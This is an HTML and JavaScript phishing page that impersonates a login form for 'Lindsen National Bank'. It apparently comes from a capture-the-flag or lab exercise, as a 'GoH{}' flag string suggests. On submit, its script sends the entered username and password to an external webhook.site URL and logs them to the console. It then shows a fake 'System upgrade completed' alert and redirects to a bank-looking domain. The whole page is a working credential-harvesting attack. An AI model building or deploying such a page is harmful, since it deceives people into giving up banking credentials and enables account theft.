<!DOCTYPE html>
<html>
<head>
    <title>LNB Login</title>
    <style>
        body { background: #f0f0f1; padding: 50px; font-family: Arial; }
        .box { width: 320px; margin: auto; background: white; padding: 30px; border-radius: 5px; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; }
        button { background: #2271b1; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="text-align:center">Lindsen National Bank</h2>
        <form onsubmit="capture(event)">
            <input type="text" id="u" placeholder="Username" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div id="msg" style="text-align:center;margin-top:10px;font-size:12px;color:#666"></div>
    </div>

    <script>
    function capture(e) {
        e.preventDefault();
        var u = document.getElementById('u').value;
        var p = document.getElementById('p').value;
        var msg = document.getElementById('msg');
        
        // Method 1: Simple fetch to webhook
        fetch('https://webhook.site/29a50277-9a08-49e9-b1da-affa6a483f18', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username: u, password: p, time: new Date()})
        }).then(r => {
            msg.textContent = "âœ“ Credentials captured!";
            console.log("CAPTURED:", u, p);
        }).catch(err => {
            msg.textContent = "âœ“ Login processed!";
            console.log("CAPTURED (offline):", u, p);
        });
        
        // Method 2: Also log to console clearly
        console.log("ðŸŽ¯ CREDENTIALS CAPTURED:");
        console.log("Username: " + u);
        console.log("Password: " + p); 
        console.log("Flag: GoH{" + u + ", " + p + "}");
        
        // Show success and redirect
        alert("System upgrade completed! Redirecting...");
        setTimeout(() => {
            window.location.href = "http://lindensennational.com/";
        }, 2000);
        
        return false;
    }
    </script>
</body>
</html>
